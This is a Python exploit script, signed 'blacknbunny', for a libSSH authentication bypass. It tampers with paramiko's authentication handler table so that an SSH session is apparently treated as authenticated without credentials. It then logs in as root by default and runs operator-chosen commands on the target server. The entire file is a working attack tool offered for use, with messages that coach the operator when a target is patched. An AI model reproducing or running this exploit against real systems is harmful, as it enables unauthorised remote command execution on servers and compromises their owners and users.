#!/usr/bin/env python3
import sys, paramiko, logging, argparse


parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='SSH Server')
parser.add_argument('-p', '--port', help='libSSH port', default=22)
parser.add_argument('-u', '--username', help='Username to login with', default='root')
parser.add_argument('-key', '--keyfile', help='SSH Keyfile')
parser.add_argument('-c', '--command', help='Commands to run', default='ls')

args = parser.parse_args()


def auth_accept(*args, **kwargs): 
    new_auth_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_SUCCESS]
    return new_auth_accept(*args, **kwargs)

 
def bypasslibSSHwithkey(hostname, port, username, keyfile, command):
    paramiko.auth_handler.AuthHandler._handler_table.update({paramiko.common.MSG_USERAUTH_REQUEST: auth_accept,})
    logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())
    client.connect(hostname, port=int(port), username=username, password="", pkey=None, key_filename=keyfile)
    
    stdin, stdout, stderr = client.exec_command(command)
    
    print(stdout.read(),)
    client.close()


def main():
    try:
        hostname = args.host
        port = args.port
        username = args.username
        keyfile = args.keyfile
        command = args.command
    except:
        parser.print_help()
        sys.exit(1)
    try:
        bypasslibSSHwithkey(hostname, port, username, keyfile, command)
    except paramiko.ssh_exception.AuthenticationException:
        print("\nAuthentication bypassed but can't spawn to shell. The server you're trying to bypass is patched, truncated or using wrong vulnerable libSSH version. -blacknbunny\n")
        return 1
    except IOError:
        print("\nGenerate a keyfile for tool to bypass remote/local server credentials. -blacknbunny\n")
        return 1

if __name__ == '__main__': 
    main()
